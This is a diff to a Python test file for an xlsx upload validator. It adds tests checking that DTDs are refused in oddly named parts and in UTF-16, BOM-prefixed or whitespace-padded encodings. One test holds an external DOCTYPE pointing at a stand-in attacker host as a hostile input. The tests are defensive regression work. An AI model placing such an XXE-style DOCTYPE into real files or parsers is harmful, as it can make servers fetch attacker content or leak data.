@@ -5,8 +5,7 @@ Each test here fails under a mutation of one guard that every earlier test survi
 - wire v2: the column cap, an empty row and the count ranges are checked on their own,
   not only through another check that happens to refuse the same reply.
 
-One finding is marked xfail (strict): a DTD in an XML part whose name doesn't end in
-.xml/.rels/.vml is not refused (see the test's reason).
+A DTD in an XML part is refused whatever the part is called (the T11 finding, fixed).
 """
 
 import io
@@ -116,19 +115,51 @@ def test_entities_in_a_part_not_named_xml_are_still_invalid(attack: str) -> None
     assert code_of(data) == "invalid_file"
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason=(
-        "T11 finding: refuse_dtds selects parts by extension (.xml/.rels/.vml), but openpyxl "
-        "reads shared strings at whatever part name the content types and relationships "
-        "give. A DTD in xl/strings.bin is parsed, against xlsx.py's "
-        "'a DTD anywhere is invalid_file'. Entities are still refused by defusedxml (test "
-        "above); only a DTD without entities, e.g. an external DOCTYPE, gets through."
-    ),
-)
 def test_a_dtd_in_a_part_not_named_xml_is_invalid() -> None:
+    # T11 finding: parts were chosen by extension; openpyxl finds them by content type.
     head, _ = HOSTILE_PROLOGUES["xxe_dtd"]
     assert code_of(_strings_part_named("strings.bin", head)) == "invalid_file"
+
+
+@pytest.mark.parametrize("name", ["strings.dat", "STRINGS", "s.XmL.bak", "data/sst"])
+@pytest.mark.parametrize("attack", sorted(HOSTILE_PROLOGUES))
+def test_a_dtd_in_a_part_declared_with_an_odd_extension_is_invalid(name: str, attack: str) -> None:
+    head, _ = HOSTILE_PROLOGUES[attack]
+    assert code_of(_strings_part_named(name, head)) == "invalid_file"
+    assert code_of(_strings_part_named(name, XML_DECL)) == "parsed"
+
+
+@pytest.mark.parametrize(
+    "encode",
+    [
+        lambda text: text.encode("utf-16"),  # with a BOM
+        lambda text: text.encode("utf-16-le"),
+        lambda text: text.encode("utf-16-be"),
+        lambda text: b"\xef\xbb\xbf" + text.encode(),  # UTF-8 BOM
+        lambda text: b" \r\n\t" * 30_000 + text.encode(),  # whitespace past the first read
+    ],
+    ids=["utf16-bom", "utf16-le", "utf16-be", "utf8-bom", "leading-space"],
+)
+def test_a_dtd_is_found_whatever_the_encoding_or_leading_space(encode: Any) -> None:
+    doctype = '<!DOCTYPE x SYSTEM "http://attacker.example/evil.dtd"><x/>'
+    data = make_xlsx(extra=[("xl/odd.bin", encode(doctype))])
+    assert code_of(data) == "invalid_file"
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        b"\x89PNG\r\n\x1a\n" + b"\0" * 32,
+        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 32,  # vbaProject.bin (CFB)
+        b"\x01\x00\x00\x00EMF",
+        b"",
+        b"   \n",
+        b"plain text, not xml",
+    ],
+    ids=["png", "cfb", "emf", "empty", "blank", "text"],
+)
+def test_binary_and_non_xml_parts_are_left_alone(payload: bytes) -> None:
+    assert code_of(make_xlsx(extra=[("xl/media/blob.bin", payload)])) == "parsed"
 
 
 # --- wire v2: each parent check on its own -----------------------------------------------
